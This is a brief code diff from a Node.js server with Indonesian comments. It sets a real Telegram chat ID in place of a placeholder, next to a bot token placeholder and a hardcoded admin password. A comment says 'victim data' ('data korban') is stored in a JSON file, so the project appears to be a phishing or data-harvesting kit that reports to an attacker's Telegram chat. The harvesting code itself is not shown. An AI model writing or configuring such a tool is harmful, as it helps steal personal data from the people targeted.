@@ -10,7 +10,7 @@ const PORT = process.env.PORT || 3000;
 
 // ========== KONFIGURASI ==========
 const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // GANTI DENGAN TOKEN BOT ANDA
-const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // GANTI DENGAN CHAT ID ANDA
+const CHAT_ID = '6834832649';     // GANTI DENGAN CHAT ID ANDA
 const ADMIN_PASSWORD = '083183';
 
 // Data korban disimpan di file JSON
